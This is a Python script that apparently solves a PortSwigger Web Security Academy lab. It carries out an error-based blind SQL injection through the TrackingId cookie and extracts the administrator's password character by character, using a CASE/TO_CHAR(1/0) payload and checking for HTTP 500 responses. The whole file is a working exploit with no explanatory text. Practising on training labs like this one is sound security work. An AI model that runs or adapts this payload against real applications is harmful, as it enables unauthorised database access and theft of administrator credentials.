import requests
import string

url = "https://0ada00c004a362db807a357e0090004b.web-security-academy.net/"

cookies = {
    "TrackingId": "",
    "session": "yNWGUZU3v1olsqa0YCrB7QVXcZI1Fzfl"
}

charset = string.ascii_letters + string.digits
password = ""

for position in range(1, 50):
    found = False
    for char in charset:
        payload = (
            "KKfdzjixiJyvCCTf' AND " f"(SELECT CASE WHEN SUBSTR(password, {position}, 1) = '{char}' THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username = 'administrator') = 'a'-- -"
        )
        cookies["TrackingId"] = payload
        response = requests.get(
            url,
            cookies=cookies,
            timeout=10
        )
        if response.status_code == 500:
            password += char
            print(f"Position {position}: {char}")
            print(f"Password: {password}")
            found = True
            break
    if not found:
        break

print("\nFinal password:", password)
